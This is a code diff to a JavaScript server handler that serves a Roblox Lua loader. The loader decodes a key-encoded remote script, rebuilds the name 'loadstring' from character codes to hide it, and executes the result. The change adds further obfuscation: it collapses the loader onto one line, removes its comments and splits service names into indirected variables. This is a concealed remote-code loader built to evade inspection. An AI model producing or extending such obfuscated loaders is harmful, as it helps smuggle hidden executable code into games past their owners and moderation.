@@ -148,36 +148,13 @@ export default {
       const textContent = await resp.text();
       const content = `game:GetService("ReplicatedStorage"):WaitForChild("${data.Name}").Value = tostring(math.random(1000000, 10000000))\n${textContent}`;
       const encoded = EncodeScript(content, String(data.Key));
-
-      const decodedFn = GetRandomName();
-      const loadFn = GetRandomName();
+      const decodedStr = GetRandomName();
+      const fnStr = GetRandomName();
       const script = `
-local function ${decodedFn}(encodedStr, key)
-    local result = {}
-    local parts = string.split(encodedStr, "/")
-    for i = 1, #parts do
-        local byte = tonumber(parts[i])
-        local k = key:byte(((i - 1) % #key) + 1)
-        local decoded = (byte - k + 256) % 256
-        table.insert(result, string.char(decoded))
-    end
-    return table.concat(result)
-end
+      function ${decodedStr}(encodedStr, key) local result = {} local parts = string.split(encodedStr, "/") for i = 1, #parts do local byte = tonumber(parts[i]) local k = key:byte(((i - 1) % #key) + 1) local decoded = (byte - k + 256) % 256 table.insert(result, string.char(decoded)) end return table.concat(result) end 
+      local a = game local b = "GetService" local c = "ReplicatedStorage" local d = "Destroy" obj = a[b](a, c)["${data.Name}"].Value 
+      local ${fnStr}="";for _, c in ipairs({108, 111, 97, 100, 115, 116, 114, 105, 110, 103}) do ${fnStr}=${fnStr}..string.char(c);end(getfenv()[${fnStr}] or _G[${fnStr}] or _ENV and _ENV[${fnStr}])(${decodedStr}("${encoded}", obj))()`;
 
-local obj = game:GetService("ReplicatedStorage")["${data.Name}"].Value
-
--- Create 'loadstring' via obfuscation
-local ${loadFn} = ""
-for _, c in ipairs({108, 111, 97, 100, 115, 116, 114, 105, 110, 103}) do
-    ${loadFn} = ${loadFn} .. string.char(c)
-end
-
--- Decode and assign to temporary variable
-local __decoded_code__ = ${decodedFn}("${encoded}", obj)
-
--- Run the decoded string using loadstring()
-(getfenv()[${loadFn}] or _G[${loadFn}] or (_ENV and _ENV[${loadFn}]))(__decoded_code__)()
-`;      
       return new Response(script, {
         headers: { "Content-Type": "text/plain" }
       });
